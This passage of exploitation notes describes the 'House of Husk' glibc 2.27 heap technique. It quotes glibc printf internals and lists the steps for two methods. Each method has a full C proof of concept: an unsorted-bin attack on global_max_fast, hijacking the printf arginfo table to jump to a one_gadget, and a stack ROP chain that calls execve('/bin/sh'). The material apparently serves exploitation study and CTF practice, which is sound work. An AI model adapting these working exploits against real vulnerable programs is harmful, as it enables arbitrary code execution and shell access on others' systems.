- `register_printf_function`:
  ```C
    if (__printf_function_table == NULL)
    {
      __printf_arginfo_table = (printf_arginfo_size_function **)
        calloc (UCHAR_MAX + 1, sizeof (void *) * 2);
      if (__printf_arginfo_table == NULL)
        {
          result = -1;
          goto out;
        }
      __printf_function_table = (printf_function **)
        (__printf_arginfo_table + UCHAR_MAX + 1);
    }
  ```
- check if not:
  ```C
    /* Use the slow path in case any printf handler is registered.  */
	if (__glibc_unlikely (__printf_function_table != NULL
                        || __printf_modifier_table != NULL
                        || __printf_va_arg_table != NULL))
	    goto do_positional;
  ```
- relevant overwrite:  `global_max_fast` - array `fastbinsY`, with `size = (idx * 2) + 0x20`
### a. method 1
- `printf`
- pre-requirements: fastbin and unsortedbin attack
- requirements:
	- UAF unsortedbin chunk
	- ridiculously large chunks alloc
	- `printf` with fmtstr
- exploit steps:
	- leak libc
	- overwrite `global_max_fast` by UBA
	- write addr of fake arginfo table to `__printf_arginfo_table` by relative overwrite
	- write non-null val to `printf_function_table` by relative overwrite
	- call `printf` with fmtstr
- poc:
  ```C
	/**
	 * This is a Proof-of-Concept for House of Husk
	 * This PoC is supposed to be run with libc-2.27.
	 */
	#include <stdio.h>
	#include <stdlib.h>
	#define offset2size(ofs) ((ofs) * 2 - 0x10)
	#define MAIN_ARENA       0x3ebc40
	#define MAIN_ARENA_DELTA 0x60
	#define GLOBAL_MAX_FAST  0x3ed940
	#define PRINTF_FUNCTABLE 0x3f0658
	#define PRINTF_ARGINFO   0x3ec870
	#define ONE_GADGET       0x10a38c
	int main (void)
	{
	  unsigned long libc_base;
	  char *a[10];
	  setbuf(stdout, NULL); // make printf quiet
	  /* leak libc */
	  a[0] = malloc(0x500); /* UAF chunk */
	  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
	  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
	  a[3] = malloc(0x500); /* avoid consolidation */
	  free(a[0]);
	  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
	  printf("libc @ 0x%lx\n", libc_base);
	  /* prepare fake printf arginfo table */
	  *(unsigned long*)(a[2] + ('X' - 2) * 8) = libc_base + ONE_GADGET;
	  /* unsorted bin attack */
	  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
	  a[0] = malloc(0x500); /* overwrite global_max_fast */
	  /* overwrite __printf_arginfo_table and __printf_function_table */
	  free(a[1]);
	  free(a[2]);
	  /* ignite! */
	  printf("%X", 0);
	  
	  return 0;
	}
  ```
### b. method 2
- ROP on stack, seccomp
- exploit steps:
	- leak libc
	- overwrite `global_max_fast` by UBA
	- free chunk w size = `environ`
	- overwrite 1-2 bytes of `fd` point to fake chunk header
	- prepare fake chunk header on stack
	- malloc twice w size = `environ`
	- ROP in the 2nd alloc
- poc:
  ```C
	/**
	 * House of Husk
	 * This PoC is supposed to be run with libc-2.27.
	 */
	#include <stdio.h>
	#include <stdlib.h>
	#define offset2size(ofs) ((ofs) * 2 - 0x10)
	#define MAIN_ARENA       0x3ebc40
	#define MAIN_ARENA_DELTA 0x60
	#define GLOBAL_MAX_FAST  0x3ed940
	#define ENVIRON          0x3ee098
	#define LIBC_BINSH       0x1b3e9a
	#define LIBC_POP_RDI     0x2155f
	#define LIBC_POP_RSI     0x23e6a
	#define LIBC_POP_RDX     0x1b96
	#define LIBC_EXECVE      0xe4e30
	unsigned long libc_base, addr_env, ofs_fake;
	char *a[10];
	int i;
	int main (int argc, char **argv, char **envp)
	{
	  unsigned long fake_size;
	  setbuf(stdin, NULL);
	  setbuf(stdout, NULL); // make printf quiet
	  ofs_fake = (void*)envp - (void*)&fake_size; /* this is fixed */
	  /* leak libc */
	  a[0] = malloc(0x500); /* UAF chunk */
	  a[1] = malloc(offset2size(ENVIRON - MAIN_ARENA));
	  a[2] = malloc(0x500); /* avoid consolidation */
	  free(a[0]);
	  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;
	  printf("libc @ 0x%lx\n", libc_base);
	  /* unsorted bin attack */
	  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
	  a[0] = malloc(0x500); /* overwrite global_max_fast */
	  /* leak environ */
	  free(a[1]);
	  addr_env = *(unsigned long*)a[1];
	  printf("environ = 0x%lx\n", addr_env);
	  *(unsigned long*)a[1] = addr_env - ofs_fake - 8;
	  /* prepare fake size on stack*/
	  fake_size = (offset2size(ENVIRON - MAIN_ARENA) + 0x10) | 1;
	  a[1] = malloc(offset2size(ENVIRON - MAIN_ARENA));
	  /* overwrite return address */
	  a[3] = malloc(offset2size(ENVIRON - MAIN_ARENA));
	  for(i = 0; i < 0x20; i++) {
	    *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDI + 1; /* ret sled */
	  }
	  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDX; i++;
	  *(unsigned long*)(a[3] + i*8) = 0; i++;
	  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RSI; i++;
	  *(unsigned long*)(a[3] + i*8) = 0; i++;
	  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_POP_RDI; i++;
	  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_BINSH; i++;
	  *(unsigned long*)(a[3] + i*8) = libc_base + LIBC_EXECVE; i++;
	  getchar();
	  return 0;
	}
  ```